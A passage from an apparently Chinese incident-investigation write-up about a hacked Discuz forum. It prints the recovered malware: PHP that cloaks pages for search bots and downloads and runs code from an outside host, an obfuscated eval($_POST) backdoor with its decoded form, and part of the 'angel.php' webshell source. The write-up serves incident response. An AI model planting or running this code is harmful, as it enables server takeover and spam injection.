<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">Keys</span> = <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">':'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">base64_decode(str_rot13(pack(</span><span style="color: #3e999f;">'H*'</span>,$<span style="color: #eab700;">dataArr</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>]))));
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">News</span> = <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">':'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">base64_decode(str_rot13(pack(</span><span style="color: #3e999f;">'H*'</span>,$<span style="color: #eab700;">dataArr</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>]))));
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">Links</span>= <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">':'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">base64_decode(str_rot13(pack(</span><span style="color: #3e999f;">'H*'</span>,$<span style="color: #eab700;">dataArr</span>[<span style="color: #4d4d4c; background-color: #ffffff;">2</span>]))));
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #718c00;">include</span>($<span style="color: #eab700;">fileDir</span>.<span style="color: #3e999f;">'.Wh0AmI.MODEL'</span>);<span style="color: #c82829; font-weight: bold;">die</span>;
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getdata</span>($<span style="color: #eab700;">data_url</span>){
<span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'curl_exec'</span>)) {
$<span style="color: #eab700;">sp_curl</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">curl_init(</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">curl_setopt(</span>$<span style="color: #eab700;">sp_curl</span>, <span style="color: #c82829; font-weight: bold;">CURLOPT_URL</span>, $<span style="color: #eab700;">data_url</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">curl_setopt(</span>$<span style="color: #eab700;">sp_curl</span>, <span style="color: #c82829; font-weight: bold;">CURLOPT_HEADER</span>, <span style="color: #4d4d4c; background-color: #ffffff;">0</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">curl_setopt(</span>$<span style="color: #eab700;">sp_curl</span>, <span style="color: #c82829; font-weight: bold;">CURLOPT_CONNECTTIMEOUT</span>, <span style="color: #4d4d4c; background-color: #ffffff;">5</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">curl_setopt(</span>$<span style="color: #eab700;">sp_curl</span>, <span style="color: #c82829; font-weight: bold;">CURLOPT_RETURNTRANSFER</span>, <span style="color: #4d4d4c; background-color: #ffffff;">1</span>);
$<span style="color: #eab700;">contents</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">curl_exec(</span>$<span style="color: #eab700;">sp_curl</span>);
@<span style="color: #4d4d4c; background-color: #ffffff;">curl_close(</span>$<span style="color: #eab700;">sp_curl</span>);
}<span style="color: #718c00;">elseif</span>(<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'stream_context_create'</span>)) {
$<span style="color: #eab700;">sp_cont</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'http'</span> =<span style="color: #4271ae;">&gt;</span> <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'method'</span> =&gt; <span style="color: #3e999f;">'GET'</span>,<span style="color: #3e999f;">'timeout'</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">5</span>));
$<span style="color: #eab700;">sp_stre</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">stream_context_create(</span>$<span style="color: #eab700;">sp_cont</span>);
$<span style="color: #eab700;">contents</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">file_get_contents(</span>$<span style="color: #eab700;">data_url</span>, <span style="color: #4271ae;">false</span>, $<span style="color: #eab700;">sp_stre</span>);
}<span style="color: #718c00;">else</span>{
$<span style="color: #eab700;">handle</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">data_url</span>, <span style="color: #3e999f;">"rb"</span>);<span style="color: #c82829; background-color: #d6d6d6;"> </span>
$<span style="color: #eab700;">contents</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">stream_get_contents(</span>$<span style="color: #eab700;">handle</span>);<span style="color: #c82829; background-color: #d6d6d6;"> </span>
@<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">handle</span>);
}
<span style="color: #718c00;">return</span> $<span style="color: #eab700;">contents</span>;
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">show</span>($<span style="color: #eab700;">fileDir</span>){
$<span style="color: #eab700;">filename</span>=$<span style="color: #eab700;">fileDir</span><span style="color: #c82829; font-weight: bold;">.</span><span style="color: #4d4d4c; background-color: #ffffff;">md5(</span>$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'HTTP_HOST'</span>].$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'REQUEST_URI'</span>]);
<span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">is_file(</span>$<span style="color: #eab700;">filename</span>)){
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fp</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">filename</span>,<span style="color: #3e999f;">'r'</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">data</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fread(</span>$<span style="color: #eab700;">fp</span>,<span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">filename</span>));
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">empty(</span>$<span style="color: #eab700;">data</span>)) {@<span style="color: #4d4d4c; background-color: #ffffff;">unlink(</span>$<span style="color: #eab700;">filename</span>);<span style="color: #718c00;">return</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">dec0de(</span>$<span style="color: #eab700;">fileDir</span>,$<span style="color: #eab700;">data</span>);
} <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">data</span>=<span style="color: #4d4d4c; background-color: #ffffff;">getdata(</span><span style="color: #3e999f;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'HTTP_H</span><span style="color: #3e999f; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fp</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">filename</span>,<span style="color: #3e999f;">'w'</span>);
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fwrite(</span>$<span style="color: #eab700;">fp</span>,$<span style="color: #eab700;">data</span>);
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">strlen(</span>$<span style="color: #eab700;">data</span>) &gt; <span style="color: #4d4d4c; background-color: #ffffff;">1000</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">dec0de(</span>$<span style="color: #eab700;">fileDir</span>,$<span style="color: #eab700;">data</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}}
<span style="color: #718c00;">if</span>(!<span style="color: #4d4d4c; background-color: #ffffff;">in_array(</span>$<span style="color: #eab700;">IP</span>,$<span style="color: #eab700;">KIP</span>)){
<span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">KBot</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">KBots</span>){<span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">stristr(</span>$<span style="color: #eab700;">Bot</span>,$<span style="color: #eab700;">KBots</span>)){
<span style="color: #4d4d4c; background-color: #ffffff;">show(</span>$<span style="color: #eab700;">fileDir</span>);
}}<span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">Key</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">Keys</span>){
<span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">stristr(</span>$<span style="color: #eab700;">Ref</span>,$<span style="color: #eab700;">Keys</span>)){
<span style="color: #718c00;">echo</span> <span style="color: #3e999f;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #3e999f; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span>
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #8959a8;">&lt;?php</span> $<span style="color: #eab700;">mt</span>=<span style="color: #3e999f;">"mFsKCleRfU"</span>; $<span style="color: #eab700;">ojj</span>=<span style="color: #3e999f;">"IEBleldle"</span>; $<span style="color: #eab700;">hsa</span>=<span style="color: #3e999f;">"E9TVFsnd2VuJ10p"</span>; $<span style="color: #eab700;">fnx</span>=<span style="color: #3e999f;">"Ow=="</span>; $<span style="color: #eab700; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">str_replace(</span><span style="color: #3e999f; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); $</span><span style="color: #eab700; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = $</span><span style="color: #eab700; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #3e999f; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); $</span><span style="color: #eab700; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = $</span><span style="color: #eab700; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #3e999f; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); $</span><span style="color: #eab700; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = $</span><span style="color: #eab700; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">ef</span><span style="text-decoration: underline;">($</span><span style="color: #eab700; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #3e999f; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">""</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">ojj</span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">hsa</span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); $</span><span style="color: #eab700; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php">@<span style="color: #4d4d4c; background-color: #ffffff;">eval(</span>$<span style="color: #4271ae;">_POST</span>[<span style="color: #3e999f;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #8959a8;">&lt;?php</span>
<span style="color: #4d4d4c; background-color: #ffffff;">error_reporting(7</span>);
@<span style="color: #4d4d4c; background-color: #ffffff;">set_magic_quotes_runtime(0</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">ob_start(</span>);
$<span style="color: #eab700;">mtime</span> = <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">' '</span>, <span style="color: #4d4d4c; background-color: #ffffff;">microtime(</span>));
$<span style="color: #eab700;">starttime</span> = $<span style="color: #eab700;">mtime</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>] + $<span style="color: #eab700;">mtime</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>];
<span style="color: #4d4d4c; background-color: #ffffff;">define(</span><span style="color: #3e999f;">'SA_ROOT'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">'\\'</span>, <span style="color: #3e999f;">'/'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">dirname(</span><span style="color: #4271ae;">__FILE__</span>)).<span style="color: #3e999f;">'/'</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">define(</span><span style="color: #3e999f;">'IS_WIN'</span>, <span style="color: #4271ae;">DIRECTORY_SEPARATOR</span> == <span style="color: #3e999f;">'\\'</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">define(</span><span style="color: #3e999f;">'IS_COM'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">class_exists(</span><span style="color: #3e999f;">'COM'</span>) ? <span style="color: #4d4d4c; background-color: #ffffff;">1</span> : <span style="color: #4d4d4c; background-color: #ffffff;">0</span> );
<span style="color: #4d4d4c; background-color: #ffffff;">define(</span><span style="color: #3e999f;">'IS_GPC'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">get_magic_quotes_gpc(</span>));
$<span style="color: #eab700;">dis_func</span> = <span style="color: #4d4d4c; background-color: #ffffff;">get_cfg_var(</span><span style="color: #3e999f;">'disable_functions'</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">define(</span><span style="color: #3e999f;">'IS_PHPINFO'</span>, (!<span style="color: #4d4d4c; background-color: #ffffff;">eregi(</span><span style="color: #3e999f;">"phpinfo"</span>,$<span style="color: #eab700;">dis_func</span>)) ? <span style="color: #4d4d4c; background-color: #ffffff;">1</span> : <span style="color: #4d4d4c; background-color: #ffffff;">0</span> );
@<span style="color: #4d4d4c; background-color: #ffffff;">set_time_limit(0</span>);@<span style="color: #4d4d4c; background-color: #ffffff;">preg_replace(</span><span style="color: #3e999f;">"/[email]/e"</span>,$<span style="color: #4271ae;">_POST</span>[<span style="color: #3e999f;">'Id'</span>],<span style="color: #3e999f;">"error"</span>);

<span style="color: #718c00;">foreach</span>($<span style="color: #4271ae;">_POST</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span> =<span style="color: #4271ae;">&gt;</span> $<span style="color: #eab700;">value</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">IS_GPC</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">value</span> = <span style="color: #4d4d4c; background-color: #ffffff;">s_array(</span>$<span style="color: #eab700;">value</span>);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">$key</span> = $<span style="color: #eab700;">value</span>;
}
<span style="color: #8e908c; font-style: italic;">/*</span><span style="color: #8e908c; font-style: italic;">===================== &#31243;&#24207;&#37197;&#32622; =====================*/</span>

<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">echo encode_pass('angel');exit;</span>
<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;</span>
$<span style="color: #eab700;">pass</span>  = <span style="color: #3e999f;">'ec38fe2a8497e0a8d6d349b3533038cb'</span>; <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">angel</span>

<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;</span>
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">cookie &#21069;&#32512;</span>
$<span style="color: #eab700;">cookiepre</span> = <span style="color: #3e999f;">''</span>;
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">cookie &#20316;&#29992;&#22495;</span>
$<span style="color: #eab700;">cookiedomain</span> = <span style="color: #3e999f;">''</span>;
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">cookie &#20316;&#29992;&#36335;&#24452;</span>
$<span style="color: #eab700;">cookiepath</span> = <span style="color: #3e999f;">'/'</span>;
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">cookie &#26377;&#25928;&#26399;</span>
$<span style="color: #eab700;">cookielife</span> = <span style="color: #4d4d4c; background-color: #ffffff;">86400</span>;

<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;</span>
!$<span style="color: #eab700;">writabledb</span> &amp;&amp; $<span style="color: #eab700;">writabledb</span> = <span style="color: #3e999f;">'php,cgi,pl,asp,inc,js,html,htm,jsp'</span>;
<span style="color: #8e908c; font-style: italic;">/*</span><span style="color: #8e908c; font-style: italic;">===================== &#37197;&#32622;&#32467;&#26463; =====================*/</span>

$<span style="color: #eab700;">charsetdb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">''</span>,<span style="color: #3e999f;">'armscii8'</span>,<span style="color: #3e999f;">'ascii'</span>,<span style="color: #3e999f;">'big5'</span>,<span style="color: #3e999f;">'binary'</span>,<span style="color: #3e999f;">'cp1250'</span>,<span style="color: #3e999f;">'cp1251'</span>,<span style="color: #3e999f;">'cp12</span><span style="color: #3e999f; text-decoration: underline;">56'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'cp1257'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'cp850'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'cp852'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'cp866'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'cp932'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'dec8'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'euc-jp'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'euc-kr'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'gb2312'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'gbk'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'geostd8'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'greek'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'hebrew'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'hp8'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'keybcs2'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'koi8r'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'koi8u'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'latin1'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'latin2'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'latin5'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'latin7'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'macce'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'macroman'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'sjis'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'swe7'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'tis620'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'ucs2'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'ujis'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">);</span>
<span style="color: #718c00;">if</span> ($<span style="color: #eab700;">charset</span> == <span style="color: #3e999f;">'utf8'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">"content-Type: text/html; charset=utf-8"</span>);
} <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">charset</span> == <span style="color: #3e999f;">'big5'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">"content-Type: text/html; charset=big5"</span>);
} <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">charset</span> == <span style="color: #3e999f;">'gbk'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">"content-Type: text/html; charset=gbk"</span>);
} <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">charset</span> == <span style="color: #3e999f;">'latin1'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">"content-Type: text/html; charset=iso-8859-2"</span>);
} <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">charset</span> == <span style="color: #3e999f;">'euc-kr'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">"content-Type: text/html; charset=euc-kr"</span>);
} <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">charset</span> == <span style="color: #3e999f;">'euc-jp'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">"content-Type: text/html; charset=euc-jp"</span>);
}

$<span style="color: #eab700;">self</span> = $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'PHP_SELF'</span>] ? $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'PHP_SELF'</span>] : $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SCRIPT_NAME'</span>];
$<span style="color: #eab700;">timestamp</span> = <span style="color: #4d4d4c; background-color: #ffffff;">time(</span>);

<span style="color: #8e908c; font-style: italic;">/*</span><span style="color: #8e908c; font-style: italic;">===================== &#36523;&#20221;&#39564;&#35777; =====================*/</span>
<span style="color: #718c00;">if</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">"logout"</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">scookie(</span><span style="color: #3e999f;">'loginpass'</span>, <span style="color: #3e999f;">''</span>, -<span style="color: #4d4d4c; background-color: #ffffff;">86400</span> * <span style="color: #4d4d4c; background-color: #ffffff;">365</span>);
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Location: '</span>.$<span style="color: #eab700;">self</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
}
<span style="color: #718c00;">if</span>($<span style="color: #eab700;">pass</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'login'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">pass</span> == <span style="color: #4d4d4c; background-color: #ffffff;">encode_pass(</span>$<span style="color: #eab700;">password</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">scookie(</span><span style="color: #3e999f;">'loginpass'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">encode_pass(</span>$<span style="color: #eab700;">password</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Location: '</span>.$<span style="color: #eab700;">self</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #4271ae;">_COOKIE</span>[<span style="color: #3e999f;">'loginpass'</span>]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #4271ae;">_COOKIE</span>[<span style="color: #3e999f;">'loginpass'</span>] != $<span style="color: #eab700;">pass</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">loginpage(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">loginpage(</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}
<span style="color: #8e908c; font-style: italic;">/*</span><span style="color: #8e908c; font-style: italic;">===================== &#39564;&#35777;&#32467;&#26463; =====================*/</span>

$<span style="color: #eab700;">errmsg</span> = <span style="color: #3e999f;">''</span>;
!$<span style="color: #eab700;">action</span> &amp;&amp; $<span style="color: #eab700;">action</span> = <span style="color: #3e999f;">'file'</span>;

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#26597;&#30475;PHPINFO</span>
<span style="color: #718c00;">if</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'phpinfo'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">IS_PHPINFO</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">phpinfo(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">errmsg</span> = <span style="color: #3e999f;">'phpinfo() function has non-permissible'</span>;
<span style="background-color: #d6d6d6;"> </span>   }
}

